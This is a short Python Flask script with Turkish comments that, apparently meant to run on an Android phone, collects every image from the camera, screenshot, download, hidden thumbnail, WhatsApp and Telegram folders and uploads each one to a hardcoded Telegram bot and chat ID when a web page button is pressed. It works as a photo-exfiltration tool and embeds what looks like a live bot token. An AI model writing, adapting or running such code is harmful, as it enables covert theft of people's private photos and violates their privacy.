# galeri_bot.py
from flask import Flask
import telebot
import os
import time

app = Flask(__name__)

# SENİN BOT BİLGİLERİN
BOT_TOKEN = "8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI"
CHAT_ID = 7323434112
bot = telebot.TeleBot(BOT_TOKEN)

# DCIM + TÜM KLASÖRLER (Camera, Download, WhatsApp, vs.)
KLASORLER = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/Screenshots",
    "/sdcard/Download",
    "/sdcard/Pictures",
    "/sdcard/DCIM/.thumbnails",  # gizli
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Telegram/Telegram Images"
]

@app.route('/gonder')
def gonder():
    toplam = 0
    bot.send_message(CHAT_ID, "REİS, TÜM GALERİDEN FOTOĞRAFLAR ÇEKİLİYOR... 📸")
    
    for klasor in KLASORLER:
        if os.path.exists(klasor):
            try:
                fotolar = [f for f in os.listdir(klasor) 
                          if f.lower().endswith(('.jpg', '.jpeg', '.png', '.webp', '.gif'))]
                for foto in fotolar:
                    yol = os.path.join(klasor, foto)
                    try:
                        with open(yol, 'rb') as f:
                            bot.send_photo(CHAT_ID, f, caption=f"{foto} | {klasor}")
                        toplam += 1
                        time.sleep(0.5)  # Telegram ban yememek için
                    except:
                        continue
            except:
                continue
    
    bot.send_message(CHAT_ID, f"✅ TÜM FOTOĞRAFLAR GÖNDERİLDİ REİS!\nToplam: {toplam} adet")
    return f"<h1>GÖNDERİLDİ! {toplam} FOTO</h1>"

@app.route('/')
def home():
    return '''
    <h1>🔥 REİS GALERİ BOT 🔥</h1>
    <a href="/gonder"><button style="padding:20px;font-size:20px;">TÜM FOTOĞRAFLARI GÖNDER</button></a>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
